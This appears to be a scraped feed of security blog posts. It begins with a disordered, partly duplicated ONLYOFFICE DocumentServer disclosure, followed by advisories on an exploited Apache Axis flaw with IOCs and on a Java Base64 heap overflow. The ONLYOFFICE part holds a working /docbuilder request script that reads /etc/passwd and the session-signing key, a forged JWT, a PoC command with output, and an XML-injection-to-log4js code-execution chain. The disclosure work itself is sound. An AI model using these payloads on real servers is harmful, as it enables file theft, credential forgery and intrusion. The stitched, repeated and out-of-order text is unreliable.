With the default settings, the new check rejects tokens containing document-opening fields such as editorConfig and WOPI fileInfo, even if their signatures are valid. This blocks reuse of a view-only Editor JWT at /docbuilder, as confirmed in the 10.0.0-169 test.

The native file-read code also checks supplied paths against the font map in server mode. An unknown path falls back to the default font rather than being read as the requested file.

DocBuilder conversion parameter injection enables code execution (CVE-2026-110385)

A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by ds. In the tested release, extracting a log4js appender and runtime configuration into the Data directory causes DocService to load and execute attacker code without a restart.

Technical analysis

Prerequisite: The attacker needs a request accepted by /docbuilder. The destination directory must already exist and be writable by ds. Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition.

The DocBuilder text-script dispatcher in CDocBuilder::RunTextA() forwards the optional third builder.SaveFile() argument without restricting it to supported conversion options:

const wchar_t* sParams = NULL;
if (nCountParameters > 2)
    sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML

// [1] Forward conversion parameters
int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);

The third argument at [0] reaches the private save implementation unchanged at [1].

CDocBuilder_Private::SaveFile() XML-encodes its own source and destination paths, but then appends the attacker string as raw XML:

oBuilder.WriteString(L"<?xml version=\"1.0\" 
encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>");
oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path
oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>");
oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path
oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>");
oBuilder.WriteString(std::to_wstring(type));

// ... remaining server-generated fields omitted ...

if (!sConvertionParams.empty())
{
    oBuilder.WriteString(sConvertionParams); // [4] Append raw XML
}

The paths at [2] and [3] are XML-encoded, but the raw XML appended at [4] can introduce duplicate task fields after the server-generated values.

X2T's InputParams parser processes elements sequentially and replaces an existing value whenever the same name appears again:

else if (_T("m_sFileFrom") == sName)
{
    RELEASEOBJECT(m_sFileFrom);
    m_sFileFrom = new std::wstring(sValue); // [5] Replace source path
}
else if (_T("m_sFileTo") == sName)
{
    RELEASEOBJECT(m_sFileTo);
    m_sFileTo = new std::wstring(sValue); // [6] Replace destination path
}
else if (_T("m_nFormatFrom") == sName)
{
    RELEASEOBJECT(m_nFormatFrom);
    m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format
}
else if (_T("m_nFormatTo") == sName)
{
    RELEASEOBJECT(m_nFormatTo);
    m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format
}

Assignments [5]–[8] let later XML elements replace the server-selected paths and formats. getConversionDirection() maps source format 2057 (AVS_OFFICESTUDIO_FILE_OTHER_ZIP) and destination format 0 (AVS_OFFICESTUDIO_FILE_UNKNOWN) to the directory-extraction operation:

else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom &&
         AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo)
    eRes = TCD_UNZIPDIR; // [9] Directory extraction mode

The extraction mode selected at [9] reaches x2t()'s conversion dispatcher, which uses both attacker-selected paths without containment validation:

case TCD_UNZIPDIR:
{
    result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive
}
break;

zip2dir() at [10] reads the attacker-selected archive and extracts it into the selected directory writable by ds.

Writing DocService's runtime configuration provides a route from this file write to code execution. runtimeConfigManager watches the configuration directory and automatically reloads runtime.json when it is created or changed, passing its attacker-controlled log options to the logger:

getConfig(operationContext.global)
  .then(config => {
    logger.configureLogger(config?.log?.options); // [11] Reload logging options
})

Those options reach configureLogger() at [11]; the function merges them with the cached configuration before calling log4js:

function configureLogger(options) {
const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options);
  log4js.configure(mergedOptions); // [12] Apply log4js configuration
}

The configuration applied at [12] sets the appender type to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader passes non-core types to require(), executing that module in DocService.

Exploitation

Preparing the payload files

View-only document access can lead to command execution as ds and then root inside the official container. The two exploit chains use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry.

Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed.

In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer.

Technical analysis

Prerequisite: The attacker needs a valid Editor JWT for any document and access to /docbuilder. Target files must be readable by ds. The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required.

The default-secret branch in getTenantSecret() contains:

switch (type) {
case commonDefines.c_oAscSecretType.Browser:
case commonDefines.c_oAscSecretType.Inbox:
    res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key
break;
// ... other token types omitted ...
}

The branch at [0] selects the same configured signing key for Browser and Inbox tokens.

builderRequest() passes the request to getRequestParams():

const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation
if (authRes.isDecoded) {
  cmd.setWithAuthorization(true);
}

At [1], builderRequest() delegates JWT validation to getRequestParams(). That function's query-token branch checks the signature using the Inbox key:

if (tenTokenEnableRequestInbox) {
  res.code = constants.VKEY;
let checkJwtRes;
if (res.params.token) {
// [2] Inbox signature check
checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox);
  } else {
    checkJwtRes = yield checkJwtHeader(ctx, req);
  }
// ... remaining validation and decoded-claim handling omitted ...
}

A view-only Editor JWT passes the signature check at [2] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder.

/docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call GetFontBinary() with a supplied filename:

std::wstring sFile = file->toStringW();
bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/'));
if (bIsFullFilePath)
{
    bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check
}

// ... font-map fallback omitted ...

return CJSContext::createUint8Array(sFile); // [4] Return file bytes

GetFontBinary() accepts an existing absolute path at [3] and returns its bytes at [4]. Ssani4 previously reported this native file-read behavior in DocumentBuilder issue #147 on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder. ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0.

Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains.

Exploitation

Reading a server file

The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is:

POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

builder.CreateFile("docx");
var bytes = native.GetFontBinary("/etc/passwd");
if (bytes === null || typeof bytes === "undefined") throw new Error("read failed");
var hex = "";
for (var i = 0; i < bytes.length; i++)
    hex += ("0" + bytes[i].toString(16)).slice(-2);
var paragraph = Api.CreateParagraph();
paragraph.AddText("R7FILE:" + hex + ":END");
Api.GetDocument().Push(paragraph);
builder.SaveFile("docx", "stolen.docx");
builder.CloseFile();

DocumentServer executes the script as ds and returns a URL for stolen.docx. The PoC downloads stolen.docx, extracts the hex between R7FILE: and :END from word/document.xml, and decodes it to recover the contents of /etc/passwd. Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary.

Stealing the session signing key

The attacker repeats the same request for /etc/onlyoffice/documentserver/local.json. In the tested configuration, services.CoAuthoring.secret.session.string contained the Session JWT signing key. If services.CoAuthoring.secret.session.file instead names a key file, the attacker reads that file with the same GetFontBinary() request.

Forging a save credential

The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account:

{
  "document": {
    "key": "external-document-20260821",
    "permissions": {
      "download": true,
      "print": true
    }
  },
  "editorConfig": {
    "user": {
      "id": "rapid7-poc",
      "index": 1
    }
  },
  "iat": 1787329293,
  "exp": 1787329593
}

The attacker submits a normal SAVE_TYPE_PART_START request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions.

The file-read and JWT-forgery PoC uses a view-only Editor JWT to read /etc/passwd, steal the Session JWT signing key and verify a forged token for an attacker-chosen document key:

python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --read-file /etc/passwd \
  --read-output /tmp/stolen-passwd \
  --document-key external-document-20260821 \
  --output-token /tmp/forged-session.jwt \
  --timeout 180

Output excerpt:

[+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd
[+] forged session JWT accepted for document key: external-document-20260821 (save key _7717)
[+] forged JWT written to: /tmp/forged-session.jwt
[+] forged JWT (expires at Unix time 1787329593):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww

The file recovered to the attacker's machine contained the target's account data:

$ head -n 5 /tmp/stolen-passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

The JWT printed above was signed with the key recovered from local.json. DocumentServer accepted that signature during the normal save-key reservation:

{"status":"ok","data":"_7717"}

Fix

In 10.0.0-169, builderRequest() now tells the token validator that this is a DocBuilder request:

-const authRes = yield docsCoServer.getRequestParams(ctx, req);
+authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);

With the default settings, the new check rejects tokens containing document-opening fields such as editorConfig and WOPI fileInfo, even if their signatures are valid. This blocks reuse of a view-only Editor JWT at /docbuilder, as confirmed in the 10.0.0-169 test.

The native file-read code also checks supplied paths against the font map in server mode. An unknown path falls back to the default font rather than being read as the requested file.

A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by ds. Technical analysis

Prerequisite: The attacker needs a request accepted by /docbuilder. The destination directory must already exist and be writable by ds. Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition.

The DocBuilder text-script dispatcher in CDocBuilder::RunTextA() forwards the optional third builder.SaveFile() argument without restricting it to supported conversion options:

const wchar_t* sParams = NULL;
if (nCountParameters > 2)
    sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML

// [1] Forward conversion parameters
int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);

The third argument at [0] reaches the private save implementation unchanged at [1].

CDocBuilder_Private::SaveFile() XML-encodes its own source and destination paths, but then appends the attacker string as raw XML:

oBuilder.WriteString(L"<?xml version=\"1.0\" 
encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>");
oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path
oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>");
oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path
oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>");
oBuilder.WriteString(std::to_wstring(type));

// ... remaining server-generated fields omitted ...

if (!sConvertionParams.empty())
{
    oBuilder.WriteString(sConvertionParams); // [4] Append raw XML
}

The paths at [2] and [3] are XML-encoded, but the raw XML appended at [4] can introduce duplicate task fields after the server-generated values.

X2T's InputParams parser processes elements sequentially and replaces an existing value whenever the same name appears again:

else if (_T("m_sFileFrom") == sName)
{
    RELEASEOBJECT(m_sFileFrom);
    m_sFileFrom = new std::wstring(sValue); // [5] Replace source path
}
else if (_T("m_sFileTo") == sName)
{
    RELEASEOBJECT(m_sFileTo);
    m_sFileTo = new std::wstring(sValue); // [6] Replace destination path
}
else if (_T("m_nFormatFrom") == sName)
{
    RELEASEOBJECT(m_nFormatFrom);
    m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format
}
else if (_T("m_nFormatTo") == sName)
{
    RELEASEOBJECT(m_nFormatTo);
    m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format
}

else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom &&
         AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo)
    eRes = TCD_UNZIPDIR; // [9] Directory extraction mode

The extraction mode selected at [9] reaches x2t()'s conversion dispatcher, which uses both attacker-selected paths without containment validation:

case TCD_UNZIPDIR:
{
    result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive
}
break;

zip2dir() at [10] reads the attacker-selected archive and extracts it into the selected directory writable by ds.

Writing DocService's runtime configuration provides a route from this file write to code execution. runtimeConfigManager watches the configuration directory and automatically reloads runtime.json when it is created or changed, passing its attacker-controlled log options to the logger:

getConfig(operationContext.global)
  .then(config => {
    logger.configureLogger(config?.log?.options); // [11] Reload logging options
})

Those options reach configureLogger() at [11]; the function merges them with the cached configuration before calling log4js:

function configureLogger(options) {
const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options);
  log4js.configure(mergedOptions); // [12] Apply log4js configuration
}

The configuration applied at [12] sets the appender type to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader passes non-core types to require(), executing that module in DocService.

item.title: Rapid7 Detected Exploitation of CVE-2026-90436 against Atlassian Confluence Data Center, N-able N-central also Exploited
item.description:
Overview

On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436, a critical unsafe reflection vulnerability (CWE-470) in Axis 1.x that allows for unauthenticated remote code execution (RCE). Apache Axis is a Simple Object Access Protocol (SOAP) implementation used for the creation of Java Web services. CISA has assigned CVE-2026-90436 a CVSS score of 9.8 Critical.

Since the initial November 6 disclosure, it has transpired that some versions of Atlassian Confluence Data Center and N-able N-central use the affected Axis library and are vulnerable to CVE-2026-90436. Both products require a non-default configuration in order to be vulnerable.

CVE-2026-90436 is now being actively exploited in the wild against both known affected products. On November 13, 2026, Rapid7 MDR detected exploitation of CVE-2026-90436 against Atlassian Confluence Data Center in a customer environment. Separately, on November 13, 2026, N-able reported exploitation in the wild against N-central for a vulnerability that strongly correlates to CVE-2026-90436. A proof-of-concept exploit that leverages CVE-2026-90436 and targets N-central was published on November 12, 2026, as part of a series of public zero-day disclosures against N-central.

On November 17, 2026, a Metasploit exploit module was released. The module exploits CVE-2026-90436 to achieve unauthenticated remote code execution against vulnerable Atlassian Confluence Data Center instances when “Remote API (XML-RPC & SOAP)” is enabled.

On November 18, 2026, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-90436 to its Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation.

Rapid7 recommends remediating exposed systems on an emergency basis outside of normal patching cycles.

MDR observed exploitation

On November 13, 2026, Rapid7's MDR team responded to a surge of alerts firing on the abnormal child processes launched by an Atlassian Confluence server. A review of the Confluence access logs revealed unauthenticated POST requests to /plugins/servlet/soap-axis1/confluenceservice-v2, each returning an HTTP 500 (Internal Server Error). Despite the error responses, endpoint telemetry showed Confluence's Java process launching Bash and curl as the dedicated confluence service account, within seconds of these requests. The attacker proceeded to run hundreds of hex-encoded shell commands and scripts fetched from temporary Pinggy and Cloudflare Tunnel domains. Each command wrapped its output in labeled delimiters, and carried sequential task IDs, a structure that suggests the use of AI-assisted automated tooling.

From this foothold, the attacker enumerated the host, network, Confluence configuration, encryption keys, and database settings. Just over three minutes after the first observed execution, the attackers were authenticating to MySQL with Confluence's own database credentials, querying page bodies, application links, and attachments with names associated with credentials, tokens, VPN configurations, and private keys. The attacker's scripts, likely AI-generated, then targeted files in Confluence's default location for uploaded page attachments (/var/atlassian/application-data/confluence/attachments/v4/), parsed Office documents, searched for credentials, and hunted for payment card numbers, using Luhn checks to filter out false positives.

The attacker continued extensive enumeration, mapping various internal services. They used a Confluence application credential to query the internal Atlassian Crowd API for users and group memberships, then ran Impacket's GetNPUsers.py against a domain controller, attempting an AS-REP roasting attack.

Although these attempts failed, the access we did observe relied on credentials stored in Confluence, and roughly four hours after the first exploit request, the attacker had acquired a service account credential and began querying a production cloud data warehouse. Approximately twelve hours after the first exploit request, the attacker signed in to Microsoft 365 as an integration service account using legacy authentication from 192.238.253[.]176. The same address appeared in the hostname of the Pinggy tunnel and in exploit requests observed earlier in the intrusion.

Mitigation guidance

Prioritize internet-accessible instances with the relevant APIs enabled, and check internal deployments as well. Apply the product-specific actions below, then investigate systems that were exposed for evidence of compromise.

Axis 1.x through 1.4 is affected but has reached end of life (EOL) and Apache does not plan to publish a fixed Axis 1.x release. Apache recommends moving to another SOAP engine (for example, Apache Axis 2) or using an Axis 1.x build with this patch applied. Organizations using products that are affected by this issue should follow the product vendor's specific remediation instructions.

Atlassian Confluence Data Center

Atlassian lists versions 1.x through to 9.x as affected when “Remote API (XML-RPC & SOAP)” is enabled. Version 9.2.28 is the fixed release. The setting has been off by default for new installations since version 3.0. Confluence version 10.x and later removed the feature so are not vulnerable, and Atlassian Cloud is unaffected.

Affected users should upgrade to version 9.2.28 or a current unaffected 10.x release. If patching must wait, an administrator can open “General Configuration” and “Further Configuration”, edit the settings, clear “Remote API (XML-RPC & SOAP)”, and save. The change takes effect without restarting Confluence, but integrations using the API may stop working.

Follow the Confluence advisory for the latest fixes and mitigation instructions.

N-able N-central

On-premises administrators should confirm that “Legacy API” is disabled, even on 2026.4 HF2. N-able states that it is off by default, and provides instructions for disabling Legacy API. Its November 13 guidance says hosted environments received temporary protections directly; customers in both hosting models must still follow the vendor's Agent and Probe upgrade guidance. N-able also temporarily disabled the Intune integration as a precaution. Refer to the N-able security update for these responsibilities.

Update: On November 16, 2026, N-able released N-central 2026.4 HF3 (2026.4.1.39) which addresses multiple issues including seventeen new CVEs. The “Legacy API” feature which exposed the vulnerable CVE-2026-90436 Axis attack surface has been disabled in this new release. N-central users should upgrade to N-central 2026.4 HF3 on an emergency basis outside of normal patching cycles.

Follow the N-able advisory for the latest fixes and mitigation instructions.

IOCs

The presence of these IOCs in logs should prompt investigation, but the absence of these addresses does not confirm that an environment was unaffected.

Atlassian Confluence Data Center

The following IP addresses and domains are associated with observed exploitation of CVE-2026-90436 against Atlassian Confluence Data Center:

  • 192.238.253[.]176

  • 5.133.47[.]243

  • 163.182.68[.]109

  • 104.13.106[.]166

  • *.trycloudflare[.]com

  • wpefh-192-238-253-176.free.pinggy[.]net

  • webhook[.]site

N-able N-central

N-able's November 13 incident update lists these IP addresses as IOCs for N-central customers who had not disabled Legacy API.

  • 157.20.241[.]16

  • 139.99.69[.]109

  • 79.76.51[.]56

The vendor's update also lists associated URLs for use in compromise assessment.

Updates

  • November 16, 2026: Initial publication.

  • November 17, 2026: Updated Remediation section for N-central.
  • November 17, 2026: Added the MDR observed exploitation section and updated IOCs.
  • November 19, 2026: Added CISA KEV addition to the Overview section, and linked the Metasploit module.

item.title: Who Has Access to Claude? Bring AI Identity and Access Context Into Surface Command
item.description:
Approving an AI service is only the starting point. As employees adopt Claude and their responsibilities change, security teams need to know who has access, which users hold administrative privileges, and whether those roles and group memberships still reflect the work they do.

IBM’s 2025 Cost of a Data Breach Report found that, among studied organizations reporting an AI-related breach, 97% lacked proper AI access controls. The finding highlights a broader challenge: AI adoption needs security practices that extend beyond the initial approval, supported by information teams can use to review access with administrators and service owners.

item.title: CVE-2026-114938: Reported Critical Pre-authentication Remote Code Execution in Java 17
item.description:
Overview

On November 17, 2026, Oracle released patches for CVE-2026-114938, a heap-based buffer overflow (CWE-122) in the hardware-accelerated Base64 decoder used by OpenJDK and its downstream distributions, such as Oracle Java SE, and Oracle GraalVM. The vulnerability, dubbed “Java4Shell” by finders Calif, can allow an unauthenticated remote attacker to crash a Java application or execute code with the privileges of its Java process. Oracle rates the vulnerability High, with a CVSS v3.1 score of 8.1 and high attack complexity, in its November security advisory.

Affected OpenJDK runtimes enable the vulnerable Base64 optimization by default when the Java virtual machine (JVM) can use the required x86-64 CPU features, including AVX-512 VBMI. A Java application exposes the flaw when it passes untrusted data to that optimized decoder. For example, a web service may decode HTTP Basic credentials before it checks the username and password. Red Hat reports no known exposure on ARM64 or on x86-64 processors without AVX-512 VBMI in its OpenJDK bulletin.

Calif’s disclosure states that they demonstrated unauthenticated remote code execution against several popular Java based applications, and they have published a local proof of concept (PoC) for CVE-2026-114938, which can test if a local JDK is vulnerable.

Given the ubiquitous nature of Java and its deployment across enterprise environments, Rapid7 recommends identifying and remediating affected systems, with a focus on Internet exposed systems, on an emergency basis and outside of normal patching cycles.

Rapid7 is actively monitoring the situation and will update this blog as new information arrives.

For the latest vendor release information, refer to Oracle's November security update notice and OpenJDK's vulnerability advisories.

Technical overview

CVE-2026-114938 affects a hardware-specific optimization in HotSpot, the Java virtual machine used by many OpenJDK distributions. When frequently used Base64 decoding code is compiled, HotSpot can substitute a native routine that processes multiple bytes at once. The vulnerable path requires an x86-64 runtime, CPU features including AVX-512 VBMI, and effective JVM settings that permit the optimizing compiler and Base64 intrinsic. Consequently, an affected Java version alone does not establish that a particular application is exploitable.

The defect occurs when that routine processes a malformed final Base64 group. Its calculation of the remaining output length can become negative, enabling a wider memory write than the destination can accommodate. Confirmed malformed-tail cases produce a 64-byte store extending 62 or 63 bytes beyond the calculated decoded-output length. Java subsequently rejects the malformed input, but catching that exception does not undo the corruption. Damage to another object can remain unnoticed until later activity, including garbage collection, crashes the JVM.

Turning this constrained overwrite into code execution requires additional work. A reliable exploit typically needs to influence which objects occupy the affected memory, convert the initial corruption into useful access to other objects, and identify application or runtime behavior that permits further execution. The practical outcome therefore depends on the application, JVM build, memory layout, and security boundaries. This distinction explains why a working corruption trigger does not establish a portable exploit for every Java service.

Remote exposure arises when an application passes attacker-controlled data to the affected decoder. Authentication headers and tokens are relevant examples, but reachability must be established for the actual implementation. The published OpenJDK fix hands final groups shorter than four bytes to the ordinary Java decoder. Organizations should apply their runtime vendor's fixed build and restart affected JVMs; disabling Base64 intrinsics with -XX:-UseBASE64Intrinsics is a temporary mitigation where supported.

Rapid7 has developed an Elasticsearch proof of concept that turns CVE-2026-114938 into command execution through the Painless scripting API on tested Linux x86-64 configurations of Elasticsearch 7.17.28 and 7.17.29 with Java 17 and 21. A custom native bridge runs existing Linux programs and returns their output while Elasticsearch's syscall filter remains active. The repository includes affected, fixed, and intrinsic-disabled comparisons, process-cleanup checks, and guarded decoder tests for Elasticsearch 8.19.25 and 9.5.6. Validation includes Intel SDE and native execution on a Linode AMD EPYC KVM guest; the ordinary Elasticsearch 7.x client succeeded in one of five native attempts, on 7.17.28 with Java 21. These results apply to the documented configurations and do not establish broad exploit reliability.

Mitigation guidance

Rapid7 recommends applying the November security update as soon as possible, starting with internet-facing services that decode credentials or tokens before authentication. Identify the runtime vendor and full build each service uses, including Java runtimes bundled with applications, appliances, and container images.

OpenJDK lists release versions 17, 21, 25, and 27 as affected by CVE-2026-114938 in its November 17 advisory. Red Hat identifies OpenJDK 17.0.6 as the earliest affected version 17.

Oracle separately identifies its Java 8 Enterprise Performance Pack as affected in the Java risk matrix. The table below pairs affected Oracle builds with the November updates listed in the JDK security baselines, Enterprise Performance Pack release notes, and GraalVM release calendar.

Product Name

Vulnerable Java Version

Patched Version (Official Release Notes)

Oracle Java SE 8 Performance Edition

8u511b33-perf

8u513-perf

Oracle Java SE 17

17.0.21.0.3

17.0.21.1

Oracle Java SE 21

21.0.13.0.3

21.0.13.1

Oracle Java SE 25

25.0.5.0.3

25.0.5.1

Oracle Java SE 27

27.0.1.0.3

27.0.1.1

Oracle GraalVM for JDK 17

17.0.21.0.3

17.0.21.1

Oracle GraalVM for JDK 21

21.0.13.0.3

21.0.13.1

Oracle GraalVM Enterprise Edition

21.3.20.0.3

21.3.20.1

For other OpenJDK based distributions, use the patched package from your Java vendor. If an application or appliance bundles Java, use the product vendor’s update. Rebuild affected container images, redeploy the workloads, and restart affected services. Verify that each running Java process uses the patched build, as CIRCL recommends.

If you cannot patch an affected OpenJDK service immediately, restart its JVM with -XX:-UseBASE64Intrinsics. This disables hardware acceleration for Base64 decoding while leaving other CPU optimizations in place.

Rapid7 customers

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-114938 with authenticated vulnerability checks available to the scan engine and Rapid7 Agent. As of the November 18, content release (1.1.4119), the checks match the OpenJDK and Oracle advisories:

    • 17.0.6 to 17.0.21.1

    • 18.0.0 to 21.0.13.1

    • 22.0.0 to 25.0.5.1

    • 26.0.0 to 27.0.1.1

  • A separate check for Oracle Java SE follows Oracle’s advisory. It also flags Oracle Java 8 versions before 8u513, and Oracle Java 17.0.0 to 17.0.5. Oracle Java installations may be reported by both checks.

  • A separate check for Oracle Java SE follows Oracle’s advisory. It flags Oracle Java SE 8 Enterprise Performance Pack (8u511b33-perf) and Oracle Java 17+ versions listed in the Oracle risk matrix. Standard Oracle Java 8 (JRE/JDK) builds, including 1.8.0.x releases, are not affected by CVE-2026-114938 and are not flagged. Oracle Java installations may be reported by both checks.

The checks are based on the installed Java version. They do not assess the processor or JVM settings, so a finding indicates a potentially vulnerable version, not confirmed exploitability.

  • Force a manual content update: Administration → Troubleshooting → Run commands, enter update content, then rescan affected assets.

  • November 24, 2026: Updated the Vulnerability Management check for Oracle Java SE to refine Java 8 detection logic, resolving false positives on standard Java 8 installations by scoping detection strictly to the affected Oracle Java SE 8 Enterprise Performance Pack (8u511b33-perf). Corrected Vulnerability Management checks to detect Oracle Java SE 8 Performance Edition (-perf) builds. Added steps to verify and force a content update.
